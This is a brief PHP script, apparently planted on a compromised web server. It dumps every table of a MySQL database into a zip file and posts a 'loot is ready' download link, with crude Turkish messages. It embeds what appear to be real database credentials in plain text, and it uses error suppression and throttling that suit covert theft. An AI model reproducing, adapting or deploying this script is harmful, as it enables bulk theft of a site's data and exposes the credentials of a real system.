<?
@set_time_limit(0);
@ini_set('memory_limit', '256M');

$h = 'localhost';
$u = 'brandproduct2025_ss';
$p = 'v9XVF)DzgL0p';
$n = 'brandproduct2025_ss';

$c = @new mysqli($h, $u, $p, $n);
if($c->connect_error) die("Patladık aq: " . $c->connect_error);

$tempSql = 'temp_db.sql';
$zipName = 'safe_dump.zip';
$fp = fopen($tempSql, 'w');

$tR = $c->query("SHOW TABLES");
while($row = $tR->fetch_row()){
    $t = $row[0];
    $cT = $c->query("SHOW CREATE TABLE $t")->fetch_row();
    fwrite($fp, "\n\n" . $cT[1] . ";\n\n");
    
    $dR = $c->query("SELECT * FROM $t");
    while($data = $dR->fetch_assoc()){
        $k = array_keys($data);
        $v = array_map([$c, 'real_escape_string'], array_values($data));
        fwrite($fp, "INSERT INTO $t (`".implode("`,`",$k)."`) VALUES ('".implode("','",$v)."');\n");
    }
    usleep(50000); 
}
fclose($fp);

$z = new ZipArchive();
if ($z->open($zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
    $z->addFile($tempSql, 'database.sql');
    $z->close();
    @unlink($tempSql); // moribabaa
    echo "<h1>📦 Ganimet Hazır!</h1><a href='$zipName'>İndir amk</a>";
} else {
    echo "ZIP olmadı yarrak kafa!";
}
?>
